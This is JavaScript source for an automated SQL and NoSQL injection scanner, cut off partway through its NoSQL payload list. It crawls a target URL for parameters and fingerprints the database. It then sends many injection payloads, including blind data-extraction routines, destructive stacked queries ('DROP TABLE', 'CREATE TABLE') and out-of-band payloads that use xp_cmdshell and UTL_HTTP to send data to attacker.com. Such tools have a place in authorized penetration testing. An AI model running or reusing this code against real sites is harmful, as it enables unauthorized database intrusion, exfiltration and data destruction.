const axios = require('axios');
const { URL } = require('url');
const Logger = require('../utils/logger');
const cheerio = require('cheerio');

class SQLAnalyzer {
  constructor() {
    this.logger = new Logger();
    this.vulnerabilities = [];
    this.startTime = null;
    this.databaseFingerprints = new Map();
    this.injectionPoints = new Set();
  }

  async analyze(options) {
    this.startTime = Date.now();
    const { url, parameters } = options;
    
    this.logger.scanBanner('SQL INJECTION ANALYSIS', url);
    this.logger.logScanStart(url, 'Advanced SQL Injection Analysis');

    try {
      // Phase 1: Parameter Discovery and Mapping
      this.logger.info('🔍 Phase 1: Parameter Discovery and Mapping');
      const parameterMap = await this.discoverParameters(url, parameters);
      
      // Phase 2: Database Fingerprinting
      this.logger.info('🗄️ Phase 2: Database Fingerprinting');
      const dbInfo = await this.fingerprintDatabase(url, parameterMap);
      
      // Phase 3: Basic SQL Injection Testing
      this.logger.info('💉 Phase 3: Basic SQL Injection Testing');
      await this.testBasicSQLInjection(url, parameterMap, dbInfo);
      
      // Phase 4: Advanced SQL Injection Techniques
      this.logger.info('🧪 Phase 4: Advanced SQL Injection Techniques');
      await this.testAdvancedSQLInjection(url, parameterMap, dbInfo);
      
      // Phase 5: Blind SQL Injection Testing
      this.logger.info('🕵️ Phase 5: Blind SQL Injection Testing');
      await this.testBlindSQLInjection(url, parameterMap, dbInfo);
      
      // Phase 6: Second-Order SQL Injection
      this.logger.info('🔄 Phase 6: Second-Order SQL Injection');
      await this.testSecondOrderSQLInjection(url, parameterMap, dbInfo);
      
      // Phase 7: NoSQL Injection Testing
      this.logger.info('🍃 Phase 7: NoSQL Injection Testing');
      await this.testNoSQLInjection(url, parameterMap);
      
      // Generate results
      const results = await this.generateResults(url, parameterMap, dbInfo);
      
      this.logger.logScanComplete(url, 'Advanced SQL Injection Analysis', results);
      this.logger.generateSummary(results);
      
      return results;
      
    } catch (error) {
      this.logger.error('SQL injection analysis failed', { error: error.message, stack: error.stack });
      throw error;
    }
  }

  async discoverParameters(baseUrl, providedParams) {
    this.logger.info('🔍 Discovering injectable parameters...');
    
    const parameterMap = new Map();
    
    try {
      // Parse provided parameters
      if (providedParams) {
        const params = providedParams.split(',');
        params.forEach(param => {
          parameterMap.set(param.trim(), {
            type: 'provided',
            method: 'GET',
            location: 'query',
            testValues: []
          });
        });
      }

      // Discover parameters from the page
      const response = await axios.get(baseUrl, {
        timeout: 10000,
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; AegisScanner/1.0)'
        }
      });

      const $ = cheerio.load(response.data);
      
      // Extract URL parameters
      const parsedUrl = new URL(baseUrl);
      for (const [key, value] of parsedUrl.searchParams) {
        parameterMap.set(key, {
          type: 'url',
          method: 'GET',
          location: 'query',
          testValues: [value]
        });
      }

      // Extract form parameters
      $('form').each((_, form) => {
        const action = $(form).attr('action') || '';
        const method = $(form).attr('method') || 'GET';
        const formUrl = new URL(action || baseUrl, baseUrl).href;
        
        $(form).find('input, select, textarea').each((_, input) => {
          const name = $(input).attr('name');
          const type = $(input).attr('type') || 'text';
          const value = $(input).attr('value') || $(input).text() || '';
          
          if (name && type !== 'submit' && type !== 'button') {
            const paramKey = `${formUrl}:${name}`;
            parameterMap.set(paramKey, {
              type: 'form',
              method: method.toUpperCase(),
              location: 'body',
              url: formUrl,
              inputType: type,
              testValues: [value]
            });
          }
        });
      });

      // Extract AJAX endpoints and API parameters
      const scriptContent = response.data;
      const ajaxPatterns = [
        /\.ajax\s*\(\s*['"](.*?)['"].*?data\s*:\s*\{([^}]+)\}/g,
        /fetch\s*\(\s*['"](.*?)['"].*?body\s*:\s*JSON\.stringify\s*\(\s*\{([^}]+)\}\s*\)/g,
        /axios\.(get|post|put|delete)\s*\(\s*['"](.*?)['"].*?\{([^}]+)\}/g
      ];

      ajaxPatterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(scriptContent)) !== null) {
          const endpoint = match[1] || match[2];
          const params = match[2] || match[3];
          
          if (endpoint && params) {
            const paramNames = params.match(/['"]([^'"]+)['"]\s*:/g);
            if (paramNames) {
              paramNames.forEach(paramMatch => {
                const paramName = paramMatch.replace(/['":]/g, '');
                const fullUrl = new URL(endpoint, baseUrl).href;
                const paramKey = `${fullUrl}:${paramName}`;
                
                parameterMap.set(paramKey, {
                  type: 'ajax',
                  method: 'POST',
                  location: 'json',
                  url: fullUrl,
                  testValues: []
                });
              });
            }
          }
        }
      });

      this.logger.info(`✅ Parameter discovery complete. Found ${parameterMap.size} parameters`);

    } catch (error) {
      this.logger.warn(`Failed to discover parameters: ${error.message}`);
    }

    return parameterMap;
  }

  async fingerprintDatabase(baseUrl, parameterMap) {
    this.logger.info('🗄️ Fingerprinting database systems...');
    
    const dbInfo = {
      type: 'unknown',
      version: 'unknown',
      features: [],
      errorMessages: [],
      fingerprints: []
    };

    const fingerprintTests = [
      // MySQL
      { payload: "' AND 1=1--", dbType: 'MySQL', indicator: /mysql/i },
      { payload: "' AND VERSION()--", dbType: 'MySQL', indicator: /mysql|mariadb/i },
      { payload: "' AND @@version--", dbType: 'MySQL', indicator: /mysql|mariadb/i },
      
      // PostgreSQL
      { payload: "' AND 1=1::int--", dbType: 'PostgreSQL', indicator: /postgresql|postgres/i },
      { payload: "' AND version()--", dbType: 'PostgreSQL', indicator: /postgresql|postgres/i },
      { payload: "' AND current_database()--", dbType: 'PostgreSQL', indicator: /postgresql|postgres/i },
      
      // SQL Server
      { payload: "' AND 1=1--", dbType: 'SQL Server', indicator: /sql server|microsoft|mssql/i },
      { payload: "' AND @@version--", dbType: 'SQL Server', indicator: /sql server|microsoft|mssql/i },
      { payload: "' AND SYSTEM_USER--", dbType: 'SQL Server', indicator: /sql server|microsoft|mssql/i },
      
      // Oracle
      { payload: "' AND 1=1--", dbType: 'Oracle', indicator: /oracle/i },
      { payload: "' AND ROWNUM=1--", dbType: 'Oracle', indicator: /oracle/i },
      { payload: "' AND USER--", dbType: 'Oracle', indicator: /oracle/i },
      
      // SQLite
      { payload: "' AND 1=1--", dbType: 'SQLite', indicator: /sqlite/i },
      { payload: "' AND sqlite_version()--", dbType: 'SQLite', indicator: /sqlite/i }
    ];

    for (const [paramKey, paramInfo] of parameterMap) {
      for (let i = 0; i < fingerprintTests.length; i++) {
        const test = fingerprintTests[i];
        this.logger.progress(i + 1, fingerprintTests.length, 'Database Fingerprinting');
        
        try {
          const response = await this.sendPayload(baseUrl, paramKey, paramInfo, test.payload);
          
          if (response && response.data) {
            // Check for database-specific error messages
            if (test.indicator.test(response.data)) {
              dbInfo.type = test.dbType;
              dbInfo.fingerprints.push({
                payload: test.payload,
                evidence: response.data.substring(0, 200),
                dbType: test.dbType
              });
              
              // Extract version information
              const versionMatch = response.data.match(/version[^\d]*(\d+\.\d+[^\s]*)/i);
              if (versionMatch) {
                dbInfo.version = versionMatch[1];
              }
            }

            // Collect error messages for analysis
            const errorPatterns = [
              /error[^:]*:\s*([^\n\r]+)/i,
              /exception[^:]*:\s*([^\n\r]+)/i,
              /warning[^:]*:\s*([^\n\r]+)/i,
              /fatal[^:]*:\s*([^\n\r]+)/i
            ];

            errorPatterns.forEach(pattern => {
              const match = response.data.match(pattern);
              if (match && !dbInfo.errorMessages.includes(match[1])) {
                dbInfo.errorMessages.push(match[1]);
              }
            });
          }

        } catch (error) {
          // Network errors don't indicate database type
        }
      }
    }

    // Determine database features based on type
    switch (dbInfo.type) {
      case 'MySQL':
        dbInfo.features = ['UNION', 'INFORMATION_SCHEMA', 'LOAD_FILE', 'INTO OUTFILE'];
        break;
      case 'PostgreSQL':
        dbInfo.features = ['UNION', 'INFORMATION_SCHEMA', 'COPY', 'pg_read_file'];
        break;
      case 'SQL Server':
        dbInfo.features = ['UNION', 'INFORMATION_SCHEMA', 'xp_cmdshell', 'OPENROWSET'];
        break;
      case 'Oracle':
        dbInfo.features = ['UNION', 'ALL_TABLES', 'UTL_FILE', 'DBMS_XSLPROCESSOR'];
        break;
      case 'SQLite':
        dbInfo.features = ['UNION', 'sqlite_master', 'ATTACH'];
        break;
    }

    this.logger.info(`✅ Database fingerprinting complete. Detected: ${dbInfo.type} ${dbInfo.version}`);
    return dbInfo;
  }

  async testBasicSQLInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('💉 Testing basic SQL injection vulnerabilities...');

    const basicPayloads = [
      // Error-based payloads
      "'",
      "''",
      '"',
      '""',
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 'a'='a",
      "admin'--",
      "admin'/*",
      "' OR 1=1#",
      "' OR 1=1/*",
      
      // Union-based payloads
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3--",
      "' UNION ALL SELECT NULL--",
      
      // Boolean-based payloads
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND 'a'='a'--",
      "' AND 'a'='b'--",
      
      // Time-based payloads (database-specific)
      ...(dbInfo.type === 'MySQL' ? [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR SLEEP(5)--"
      ] : []),
      ...(dbInfo.type === 'PostgreSQL' ? [
        "' AND pg_sleep(5)--",
        "' OR pg_sleep(5)--"
      ] : []),
      ...(dbInfo.type === 'SQL Server' ? [
        "' AND WAITFOR DELAY '00:00:05'--",
        "' OR WAITFOR DELAY '00:00:05'--"
      ] : []),
      ...(dbInfo.type === 'Oracle' ? [
        "' AND DBMS_LOCK.SLEEP(5)--",
        "' OR DBMS_LOCK.SLEEP(5)--"
      ] : [])
    ];

    for (const [paramKey, paramInfo] of parameterMap) {
      for (let i = 0; i < basicPayloads.length; i++) {
        const payload = basicPayloads[i];
        this.logger.progress(i + 1, basicPayloads.length, `Testing ${paramKey.split(':').pop()}`);
        
        try {
          const startTime = Date.now();
          const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
          const responseTime = Date.now() - startTime;

          if (response) {
            const vulnerability = this.analyzeResponse(response, payload, responseTime, paramKey, paramInfo);
            if (vulnerability) {
              this.vulnerabilities.push(vulnerability);
              this.injectionPoints.add(paramKey);
              
              this.logger.logSQLInjection({
                url: vulnerability.url,
                parameter: vulnerability.parameter,
                payload: payload,
                evidence: vulnerability.evidence,
                dbType: dbInfo.type
              });
            }
          }

        } catch (error) {
          this.logger.debug(`Basic SQL injection test failed: ${error.message}`);
        }
      }
    }
  }

  async testAdvancedSQLInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('🧪 Testing advanced SQL injection techniques...');

    // Test different advanced techniques
    await this.testUnionBasedInjection(baseUrl, parameterMap, dbInfo);
    await this.testErrorBasedInjection(baseUrl, parameterMap, dbInfo);
    await this.testStackedQueries(baseUrl, parameterMap, dbInfo);
    await this.testOutOfBandInjection(baseUrl, parameterMap, dbInfo);
  }

  async testUnionBasedInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('🔗 Testing UNION-based SQL injection...');

    for (const [paramKey, paramInfo] of parameterMap) {
      if (this.injectionPoints.has(paramKey)) {
        // Determine number of columns
        const columnCount = await this.determineColumnCount(baseUrl, paramKey, paramInfo, dbInfo);
        
        if (columnCount > 0) {
          // Test data extraction
          const extractionPayloads = this.generateExtractionPayloads(columnCount, dbInfo);
          
          for (const payload of extractionPayloads) {
            try {
              const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload.query);
              
              if (response && payload.expectedData.some(data => response.data.includes(data))) {
                const vulnerability = {
                  type: 'UNION-based SQL Injection',
                  severity: 'Critical',
                  url: this.getTestUrl(baseUrl, paramKey, paramInfo),
                  parameter: paramKey.split(':').pop(),
                  payload: payload.query,
                  evidence: `Data extraction successful: ${payload.description}`,
                  response: response.data.substring(0, 500),
                  confidence: 'High',
                  extractedData: payload.expectedData.filter(data => response.data.includes(data)),
                  timestamp: new Date().toISOString()
                };

                this.vulnerabilities.push(vulnerability);
                this.logger.logSQLInjection({
                  url: vulnerability.url,
                  parameter: vulnerability.parameter,
                  payload: payload.query,
                  evidence: vulnerability.evidence,
                  dbType: dbInfo.type
                });
              }

            } catch (error) {
              // Continue with next payload
            }
          }
        }
      }
    }
  }

  async determineColumnCount(baseUrl, paramKey, paramInfo, dbInfo) {
    const maxColumns = 20;
    
    for (let i = 1; i <= maxColumns; i++) {
      const nulls = Array(i).fill('NULL').join(',');
      const payload = `' UNION SELECT ${nulls}--`;
      
      try {
        const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
        
        if (response && !this.hasUnionError(response.data, dbInfo.type)) {
          this.logger.info(`✅ Determined column count: ${i}`);
          return i;
        }
      } catch (error) {
        // Continue
      }
    }
    
    return 0;
  }

  generateExtractionPayloads(columnCount, dbInfo) {
    const payloads = [];
    const nulls = Array(columnCount).fill('NULL');
    
    // Database-specific system queries
    const systemQueries = {
      'MySQL': [
        { query: 'VERSION()', description: 'Database version', expectedData: ['mysql', 'mariadb'] },
        { query: 'USER()', description: 'Current user', expectedData: ['@'] },
        { query: 'DATABASE()', description: 'Current database', expectedData: [''] }
      ],
      'PostgreSQL': [
        { query: 'version()', description: 'Database version', expectedData: ['postgresql', 'postgres'] },
        { query: 'current_user', description: 'Current user', expectedData: [''] },
        { query: 'current_database()', description: 'Current database', expectedData: [''] }
      ],
      'SQL Server': [
        { query: '@@version', description: 'Database version', expectedData: ['sql server', 'microsoft'] },
        { query: 'SYSTEM_USER', description: 'Current user', expectedData: [''] },
        { query: 'DB_NAME()', description: 'Current database', expectedData: [''] }
      ],
      'Oracle': [
        { query: 'banner FROM v$version WHERE rownum=1', description: 'Database version', expectedData: ['oracle'] },
        { query: 'USER FROM dual', description: 'Current user', expectedData: [''] }
      ]
    };

    const queries = systemQueries[dbInfo.type] || systemQueries['MySQL'];
    
    // Generate payloads for each position
    for (let pos = 0; pos < columnCount; pos++) {
      queries.forEach(queryInfo => {
        const columns = [...nulls];
        columns[pos] = queryInfo.query;
        
        payloads.push({
          query: `' UNION SELECT ${columns.join(',')}--`,
          description: queryInfo.description,
          expectedData: queryInfo.expectedData
        });
      });
    }

    return payloads;
  }

  hasUnionError(responseData, dbType) {
    const errorPatterns = {
      'MySQL': [/different number of columns/i, /operand should contain/i],
      'PostgreSQL': [/each UNION query must have the same number/i],
      'SQL Server': [/All queries combined using a UNION/i],
      'Oracle': [/ORA-01789/i, /query block has incorrect number/i]
    };

    const patterns = errorPatterns[dbType] || errorPatterns['MySQL'];
    return patterns.some(pattern => pattern.test(responseData));
  }

  async testErrorBasedInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('❌ Testing error-based SQL injection...');

    const errorBasedPayloads = {
      'MySQL': [
        "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT version())))--",
        "' AND UPDATEXML(0x0a,CONCAT(0x0a,(SELECT version())),0x0a)--",
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
      ],
      'PostgreSQL': [
        "' AND CAST((SELECT version()) AS int)--",
        "' AND (SELECT CAST(version() AS int))--"
      ],
      'SQL Server': [
        "' AND CONVERT(int,(SELECT @@version))--",
        "' AND CAST((SELECT @@version) AS int)--"
      ],
      'Oracle': [
        "' AND CAST((SELECT banner FROM v$version WHERE rownum=1) AS number)--",
        "' AND TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))--"
      ]
    };

    const payloads = errorBasedPayloads[dbInfo.type] || errorBasedPayloads['MySQL'];

    for (const [paramKey, paramInfo] of parameterMap) {
      if (this.injectionPoints.has(paramKey)) {
        for (const payload of payloads) {
          try {
            const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
            
            if (response && this.hasDataInError(response.data, dbInfo.type)) {
              const extractedData = this.extractDataFromError(response.data, dbInfo.type);
              
              const vulnerability = {
                type: 'Error-based SQL Injection',
                severity: 'Critical',
                url: this.getTestUrl(baseUrl, paramKey, paramInfo),
                parameter: paramKey.split(':').pop(),
                payload: payload,
                evidence: 'Database information extracted via error messages',
                response: response.data.substring(0, 500),
                extractedData: extractedData,
                confidence: 'High',
                timestamp: new Date().toISOString()
              };

              this.vulnerabilities.push(vulnerability);
              this.logger.logSQLInjection({
                url: vulnerability.url,
                parameter: vulnerability.parameter,
                payload: payload,
                evidence: vulnerability.evidence,
                dbType: dbInfo.type
              });
            }

          } catch (error) {
            // Continue
          }
        }
      }
    }
  }

  hasDataInError(responseData, dbType) {
    const dataPatterns = {
      'MySQL': [/mysql/i, /version/i, /\d+\.\d+\.\d+/],
      'PostgreSQL': [/postgresql/i, /postgres/i, /version/i],
      'SQL Server': [/sql server/i, /microsoft/i, /version/i],
      'Oracle': [/oracle/i, /version/i]
    };

    const patterns = dataPatterns[dbType] || dataPatterns['MySQL'];
    return patterns.some(pattern => pattern.test(responseData));
  }

  extractDataFromError(responseData, dbType) {
    const extractionPatterns = {
      'MySQL': [
        /mysql[^0-9]*(\d+\.\d+[^\s]*)/i,
        /version[^0-9]*(\d+\.\d+[^\s]*)/i
      ],
      'PostgreSQL': [
        /postgresql[^0-9]*(\d+\.\d+[^\s]*)/i,
        /postgres[^0-9]*(\d+\.\d+[^\s]*)/i
      ],
      'SQL Server': [
        /sql server[^0-9]*(\d+\.\d+[^\s]*)/i,
        /microsoft[^0-9]*(\d+\.\d+[^\s]*)/i
      ],
      'Oracle': [
        /oracle[^0-9]*(\d+[^\s]*)/i
      ]
    };

    const patterns = extractionPatterns[dbType] || extractionPatterns['MySQL'];
    const extractedData = [];

    patterns.forEach(pattern => {
      const match = responseData.match(pattern);
      if (match) {
        extractedData.push(match[1]);
      }
    });

    return extractedData;
  }

  async testStackedQueries(baseUrl, parameterMap, dbInfo) {
    this.logger.info('📚 Testing stacked queries...');

    // Stacked queries are mainly supported by SQL Server and PostgreSQL
    if (!['SQL Server', 'PostgreSQL'].includes(dbInfo.type)) {
      return;
    }

    const stackedPayloads = [
      "'; WAITFOR DELAY '00:00:05'--",
      "'; SELECT pg_sleep(5)--",
      "'; INSERT INTO test_table VALUES ('test')--",
      "'; CREATE TABLE test_sqli (id int)--"
    ];

    for (const [paramKey, paramInfo] of parameterMap) {
      if (this.injectionPoints.has(paramKey)) {
        for (const payload of stackedPayloads) {
          try {
            const startTime = Date.now();
            const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
            const responseTime = Date.now() - startTime;

            // Check for time delay (indicates successful stacked query)
            if (responseTime > 4000 && payload.includes('DELAY')) {
              const vulnerability = {
                type: 'Stacked Queries SQL Injection',
                severity: 'Critical',
                url: this.getTestUrl(baseUrl, paramKey, paramInfo),
                parameter: paramKey.split(':').pop(),
                payload: payload,
                evidence: `Time delay indicates successful stacked query execution`,
                responseTime: responseTime,
                confidence: 'High',
                timestamp: new Date().toISOString()
              };

              this.vulnerabilities.push(vulnerability);
              this.logger.logSQLInjection({
                url: vulnerability.url,
                parameter: vulnerability.parameter,
                payload: payload,
                evidence: vulnerability.evidence,
                dbType: dbInfo.type
              });
            }

          } catch (error) {
            // Continue
          }
        }
      }
    }
  }

  async testOutOfBandInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('📡 Testing out-of-band SQL injection...');

    // Out-of-band techniques (simplified for demo)
    const oobPayloads = {
      'MySQL': [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.attacker.com\\\\share'))--"
      ],
      'SQL Server': [
        "'; EXEC xp_dirtree '//attacker.com/share'--",
        "'; EXEC master..xp_cmdshell 'nslookup attacker.com'--"
      ],
      'Oracle': [
        "' AND UTL_HTTP.request('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL--"
      ]
    };

    const payloads = oobPayloads[dbInfo.type] || [];

    for (const [paramKey, paramInfo] of parameterMap) {
      if (this.injectionPoints.has(paramKey)) {
        for (const payload of payloads) {
          try {
            const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
            
            // In a real scenario, you'd monitor DNS/HTTP logs for callbacks
            // For this demo, we just log the attempt
            this.logger.info(`🔍 Out-of-band payload sent: ${payload}`);

          } catch (error) {
            // Continue
          }
        }
      }
    }
  }

  async testBlindSQLInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('🕵️ Testing blind SQL injection...');

    await this.testBooleanBasedBlind(baseUrl, parameterMap, dbInfo);
    await this.testTimeBasedBlind(baseUrl, parameterMap, dbInfo);
  }

  async testBooleanBasedBlind(baseUrl, parameterMap, dbInfo) {
    this.logger.info('✅ Testing boolean-based blind SQL injection...');

    for (const [paramKey, paramInfo] of parameterMap) {
      try {
        // Get baseline response
        const baselineResponse = await this.sendPayload(baseUrl, paramKey, paramInfo, '');
        if (!baselineResponse) continue;

        const baselineLength = baselineResponse.data.length;
        const baselineHash = this.hashResponse(baselineResponse.data);

        // Test true condition
        const truePayload = "' AND 1=1--";
        const trueResponse = await this.sendPayload(baseUrl, paramKey, paramInfo, truePayload);
        
        // Test false condition
        const falsePayload = "' AND 1=2--";
        const falseResponse = await this.sendPayload(baseUrl, paramKey, paramInfo, falsePayload);

        if (trueResponse && falseResponse) {
          const trueHash = this.hashResponse(trueResponse.data);
          const falseHash = this.hashResponse(falseResponse.data);

          // Check if responses differ significantly
          if (trueHash === baselineHash && falseHash !== baselineHash) {
            const vulnerability = {
              type: 'Boolean-based Blind SQL Injection',
              severity: 'High',
              url: this.getTestUrl(baseUrl, paramKey, paramInfo),
              parameter: paramKey.split(':').pop(),
              payload: `True: ${truePayload}, False: ${falsePayload}`,
              evidence: 'Different responses for true/false conditions indicate blind SQL injection',
              confidence: 'High',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.injectionPoints.add(paramKey);
            
            this.logger.logSQLInjection({
              url: vulnerability.url,
              parameter: vulnerability.parameter,
              payload: vulnerability.payload,
              evidence: vulnerability.evidence,
              dbType: dbInfo.type
            });

            // Attempt data extraction
            await this.extractDataBlind(baseUrl, paramKey, paramInfo, dbInfo, 'boolean');
          }
        }

      } catch (error) {
        this.logger.debug(`Boolean-based blind test failed: ${error.message}`);
      }
    }
  }

  async testTimeBasedBlind(baseUrl, parameterMap, dbInfo) {
    this.logger.info('⏰ Testing time-based blind SQL injection...');

    const timePayloads = {
      'MySQL': [
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND IF(1=1,SLEEP(5),0)--"
      ],
      'PostgreSQL': [
        "' AND pg_sleep(5)--",
        "' AND (SELECT pg_sleep(5))--"
      ],
      'SQL Server': [
        "' AND WAITFOR DELAY '00:00:05'--",
        "' AND IF(1=1) WAITFOR DELAY '00:00:05'--"
      ],
      'Oracle': [
        "' AND DBMS_LOCK.SLEEP(5)--",
        "' AND (SELECT DBMS_LOCK.SLEEP(5) FROM dual)--"
      ],
      'SQLite': [
        "' AND (SELECT sqlite_version() FROM sqlite_master LIMIT 1 OFFSET 100000)--"
      ]
    };

    const payloads = timePayloads[dbInfo.type] || timePayloads['MySQL'];

    for (const [paramKey, paramInfo] of parameterMap) {
      for (const payload of payloads) {
        try {
          // Get baseline timing
          const baselineStart = Date.now();
          await this.sendPayload(baseUrl, paramKey, paramInfo, '');
          const baselineTime = Date.now() - baselineStart;

          // Test time-based payload
          const testStart = Date.now();
          const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
          const testTime = Date.now() - testStart;

          // Check if there's a significant delay
          if (testTime > baselineTime + 4000) {
            const vulnerability = {
              type: 'Time-based Blind SQL Injection',
              severity: 'High',
              url: this.getTestUrl(baseUrl, paramKey, paramInfo),
              parameter: paramKey.split(':').pop(),
              payload: payload,
              evidence: `Response time increased from ${baselineTime}ms to ${testTime}ms`,
              responseTime: testTime,
              baselineTime: baselineTime,
              confidence: 'High',
              timestamp: new Date().toISOString()
            };

            this.vulnerabilities.push(vulnerability);
            this.injectionPoints.add(paramKey);
            
            this.logger.logSQLInjection({
              url: vulnerability.url,
              parameter: vulnerability.parameter,
              payload: payload,
              evidence: vulnerability.evidence,
              dbType: dbInfo.type
            });

            // Attempt data extraction
            await this.extractDataBlind(baseUrl, paramKey, paramInfo, dbInfo, 'time');
            break; // Move to next parameter
          }

        } catch (error) {
          this.logger.debug(`Time-based blind test failed: ${error.message}`);
        }
      }
    }
  }

  async extractDataBlind(baseUrl, paramKey, paramInfo, dbInfo, method) {
    this.logger.info(`🔍 Attempting blind data extraction via ${method}-based technique...`);

    // Extract database name length as proof of concept
    const queries = {
      'MySQL': 'LENGTH(DATABASE())',
      'PostgreSQL': 'LENGTH(current_database())',
      'SQL Server': 'LEN(DB_NAME())',
      'Oracle': 'LENGTH((SELECT name FROM v$database))',
      'SQLite': 'LENGTH((SELECT name FROM sqlite_master WHERE type="table" LIMIT 1))'
    };

    const lengthQuery = queries[dbInfo.type] || queries['MySQL'];
    
    // Binary search for database name length
    let minLength = 1;
    let maxLength = 50;
    let actualLength = 0;

    while (minLength <= maxLength) {
      const midLength = Math.floor((minLength + maxLength) / 2);
      const condition = `${lengthQuery}>${midLength}`;
      
      let payload;
      if (method === 'boolean') {
        payload = `' AND ${condition}--`;
      } else { // time-based
        if (dbInfo.type === 'MySQL') {
          payload = `' AND IF(${condition},SLEEP(3),0)--`;
        } else if (dbInfo.type === 'PostgreSQL') {
          payload = `' AND (CASE WHEN ${condition} THEN pg_sleep(3) ELSE 0 END)--`;
        } else {
          payload = `' AND IF(${condition}) WAITFOR DELAY '00:00:03'--`;
        }
      }

      try {
        const result = await this.testBlindCondition(baseUrl, paramKey, paramInfo, payload, method);
        
        if (result) {
          minLength = midLength + 1;
        } else {
          maxLength = midLength - 1;
          actualLength = midLength;
        }

      } catch (error) {
        break;
      }
    }

    if (actualLength > 0) {
      this.logger.info(`✅ Extracted database name length: ${actualLength}`);
      
      // Log the successful data extraction
      const vulnerability = {
        type: `Blind SQL Injection Data Extraction (${method}-based)`,
        severity: 'Critical',
        url: this.getTestUrl(baseUrl, paramKey, paramInfo),
        parameter: paramKey.split(':').pop(),
        payload: 'Binary search technique',
        evidence: `Successfully extracted database name length: ${actualLength}`,
        extractedData: { databaseNameLength: actualLength },
        confidence: 'High',
        timestamp: new Date().toISOString()
      };

      this.vulnerabilities.push(vulnerability);
      this.logger.logSQLInjection({
        url: vulnerability.url,
        parameter: vulnerability.parameter,
        payload: vulnerability.payload,
        evidence: vulnerability.evidence,
        dbType: dbInfo.type
      });
    }
  }

  async testBlindCondition(baseUrl, paramKey, paramInfo, payload, method) {
    if (method === 'boolean') {
      const response = await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
      const baselineResponse = await this.sendPayload(baseUrl, paramKey, paramInfo, '');
      
      if (response && baselineResponse) {
        return this.hashResponse(response.data) === this.hashResponse(baselineResponse.data);
      }
      return false;
    } else { // time-based
      const startTime = Date.now();
      await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
      const responseTime = Date.now() - startTime;
      
      return responseTime > 2500; // 2.5 seconds threshold
    }
  }

  async testSecondOrderSQLInjection(baseUrl, parameterMap, dbInfo) {
    this.logger.info('🔄 Testing second-order SQL injection...');

    // Second-order SQL injection requires multiple requests
    // First, inject payload into a storage mechanism (e.g., user registration, profile update)
    // Then, trigger the payload execution in another part of the application

    const storagePayloads = [
      "admin'/*",
      "test' UNION SELECT 1,2,3--",
      "user'; DROP TABLE test--",
      "name'+(SELECT version())+'",
      "data'||CHR(39)||'injected"
    ];

    for (const [paramKey, paramInfo] of parameterMap) {
      if (paramInfo.type === 'form' && paramInfo.method === 'POST') {
        for (const payload of storagePayloads) {
          try {
            // Stage 1: Store the payload
            await this.sendPayload(baseUrl, paramKey, paramInfo, payload);
            
            // Stage 2: Try to trigger the payload in various ways
            const triggerEndpoints = [
              '/profile',
              '/user',
              '/admin',
              '/search',
              '/list',
              '/view'
            ];

            for (const endpoint of triggerEndpoints) {
              try {
                const triggerUrl = new URL(endpoint, baseUrl).href;
                const response = await axios.get(triggerUrl, {
                  timeout: 5000,
                  validateStatus: () => true
                });

                if (response && this.hasSecondOrderIndicators(response.data, payload)) {
                  const vulnerability = {
                    type: 'Second-Order SQL Injection',
                    severity: 'Critical',
                    url: this.getTestUrl(baseUrl, paramKey, paramInfo),
                    parameter: paramKey.split(':').pop(),
                    payload: payload,
                    evidence: 'Second-order SQL injection detected in triggered endpoint',
                    triggerUrl: triggerUrl,
                    response: response.data.substring(0, 500),
                    confidence: 'Medium',
                    timestamp: new Date().toISOString()
                  };

                  this.vulnerabilities.push(vulnerability);
                  this.logger.logSQLInjection({
                    url: vulnerability.url,
                    parameter: vulnerability.parameter,
                    payload: payload,
                    evidence: vulnerability.evidence,
                    dbType: dbInfo.type
                  });
                }

              } catch (error) {
                // Continue
              }
            }

          } catch (error) {
            // Continue
          }
        }
      }
    }
  }

  hasSecondOrderIndicators(responseData, originalPayload) {
    // Check if the original payload or its effects are visible in the response
    const indicators = [
      responseData.includes(originalPayload),
      /sql.*error/i.test(responseData),
      /mysql.*error/i.test(responseData),
      /postgresql.*error/i.test(responseData),
      /oracle.*error/i.test(responseData),
      /sqlite.*error/i.test(responseData),
      responseData.includes('UNION'),
      responseData.includes('SELECT'),
      /version.*\d+\.\d+/i.test(responseData)
    ];

    return indicators.some(indicator => indicator);
  }

  async testNoSQLInjection(baseUrl, parameterMap) {
    this.logger.info('🍃 Testing NoSQL injection vulnerabilities...');

    const noSQLPayloads = [
      // MongoDB injection payloads
      '{"$ne": null}',
      '{"$ne": ""}',
      '{"$regex": ".*"}',
      '{"$gt": ""}',
      '{"$where": "this.username == this.username"}',
      '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
      '{"username": {"$ne": null}, "password": {"$ne": null}}',
      '{"$where": "return true"}',
      '{"$where": "sleep(5000)"}',
      
      // CouchDB injection payloads
